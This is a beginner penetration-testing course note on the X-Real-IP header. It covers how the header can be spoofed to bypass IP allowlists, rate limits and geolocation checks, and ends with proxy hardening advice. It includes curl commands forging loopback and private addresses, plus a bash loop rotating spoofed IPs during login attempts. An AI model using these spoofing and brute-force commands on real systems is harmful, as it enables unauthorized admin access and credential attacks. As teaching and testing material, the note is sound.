---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.05 X-Real-IP — IP Bypass"
---

# 03.05 — X-Real-IP

## What is it?

`X-Real-IP` is a non-standard HTTP header commonly set by reverse proxies (such as Nginx, HAProxy, or Traefik) to forward the actual client's IP address to upstream application servers. 

When a client connects to a web server via a proxy, the web server sees the connection originating from the proxy's IP address rather than the client's IP address. To ensure the backend application knows who is actually connecting (for logging, geolocation, or security checks), the proxy adds the `X-Real-IP` header containing the client's IP address. 

Unlike `X-Forwarded-For`, which can append multiple IP addresses to represent a chain of proxies (e.g., `client, proxy1, proxy2`), `X-Real-IP` is designed to hold only a single IP address—representing the direct source IP that connected to the proxy.

---

## Use Cases

### 1. Bypassing IP-Based Access Control Lists (ACLs)
Applications often restrict access to administrative interfaces (e.g., `/admin`, `/internal`) to specific internal IP addresses or ranges (like `127.0.0.1`, `10.0.0.0/8`, or `192.168.0.0/16`). If the application relies on the `X-Real-IP` header to determine the client's IP address without validating that the header came from a trusted proxy, an external attacker can spoof this header to impersonate an internal client and bypass the ACL.

### 2. Evading Rate Limiting and Brute-Force Protections
Web Application Firewalls (WAFs) and backend applications often track failed login attempts or API request volume per IP address. If the application limits connections based on the IP address specified in `X-Real-IP`, an attacker can rotate the value of the `X-Real-IP` header in each request. This forces the application to treat each request as originating from a different client, effectively bypassing rate limits and enabling large-scale brute-force or credential stuffing attacks.

### 3. Geolocation Restrictions Bypass
Some platforms restrict content or features based on the user's geographic location (e.g., checking if the client IP belongs to a specific country). Attackers can spoof the `X-Real-IP` header with an IP address from an approved geographic region to bypass these restrictions.

---

## Commands

Test for IP bypass or rate limiting evasion using standard tools.

### 1. Testing Administrative Page Access with Curl
This command attempts to access a protected `/admin` endpoint by spoofing the `X-Real-IP` header to look like a local loopback address:
```bash
curl -i -H "X-Real-IP: 127.0.0.1" https://target.local/admin
```

### 2. Testing Internal IP Range Access
Try common RFC 1918 private IP addresses to bypass perimeter restriction checks:
```bash
curl -i -H "X-Real-IP: 10.0.0.1" https://target.local/internal
curl -i -H "X-Real-IP: 192.168.1.50" https://target.local/internal
```

### 3. Scripted Rate Limit Evasion
A bash loop to rotate the `X-Real-IP` header dynamically during a dictionary attack to bypass IP-based threshold blocks:
```bash
for ip in {1..20}; do
  curl -s -X POST https://target.local/login \
    -H "X-Real-IP: 203.0.113.$ip" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"password123"}' \
    -o /dev/null -w "IP: 203.0.113.$ip -> HTTP Status: %{http_code}\n"
done
```

---

## Sample Output

### Successful IP-Based Access Bypass
If the application is vulnerable, providing the spoofed header results in access to the restricted administrative page.
```http
HTTP/1.1 200 OK
Date: Tue, 16 Jun 2026 10:25:00 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Length: 1042

<!DOCTYPE html>
<html>
<head><title>Admin Console</title></head>
<body>
  <h1>Welcome to the Administrative Dashboard</h1>
  <p>Authorized access granted via local loopback bypass.</p>
  <!-- Admin functions here -->
</body>
</html>
```

### Access Denied (Not Vulnerable)
If the application securely ignores or strips client-supplied `X-Real-IP` headers, access is blocked.
```http
HTTP/1.1 403 Forbidden
Date: Tue, 16 Jun 2026 10:25:00 GMT
Content-Type: application/json; charset=UTF-8
Connection: close
Content-Length: 85

{"error": "Forbidden", "message": "Access restricted to authorized internal networks."}
```

---

## How to Fix / Secure

To prevent IP spoofing attacks via `X-Real-IP`, apply the following secure configurations:

| Risk | Fix / Mitigation |
|------|------------------|
| **Trusting Client-Supplied Headers** | Configure edge load balancers or reverse proxies (e.g., Nginx, Cloudflare) to strip or overwrite `X-Real-IP` headers received directly from the client before passing requests to backend servers. |
| **Weak Proxy Configuration** | In Nginx, use the `real_ip_header X-Real-IP;` directive combined with `set_real_ip_from` to specify the exact IP addresses of trusted upstream proxies. Do not trust headers from arbitrary IPs. |
| **ACL Relying on Headers** | Never use HTTP headers alone for sensitive authorization decisions. Implement proper session-based authentication and cryptographically signed tokens. |

---

## Related Notes
- [[02 - X-Forwarded-For]] — similar IP bypass header
- [[10 - True-Client-IP]] — Cloudflare equivalent
